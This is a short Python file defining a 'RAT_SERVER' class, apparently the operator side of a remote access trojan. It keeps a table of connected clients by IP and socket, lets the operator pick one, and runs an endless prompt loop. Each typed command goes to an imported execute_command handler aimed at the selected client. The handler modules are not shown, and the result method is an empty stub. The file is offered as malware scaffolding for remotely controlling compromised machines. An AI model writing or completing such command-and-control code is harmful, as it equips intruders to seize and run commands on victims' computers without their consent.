import socketio
import logging
from command_handlers import execute_command

# Configure logging
logging.basicConfig(level=logging.DEBUG)

class RAT_SERVER:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.clients = {}
        self.current_client_ip = None
        self.current_client_socket = None
        self.sio = socketio.Client()

        from event_handlers import setup_event_handlers
        setup_event_handlers(self)

    def set_current_client(self, client_ip, client_socket):
        self.current_client_ip = client_ip
        self.current_client_socket = client_socket

    def banner(self):
        print("RAT Server Banner")

    def result(self):
        pass  # Implement this method to handle command results

    def execute(self):
        self.banner()
        while True:
            command = input('Command >>  ')
            if not self.current_client_ip or not self.current_client_socket:
                print("No client connected.")
                continue
            result = execute_command(self, command)
            print(result)
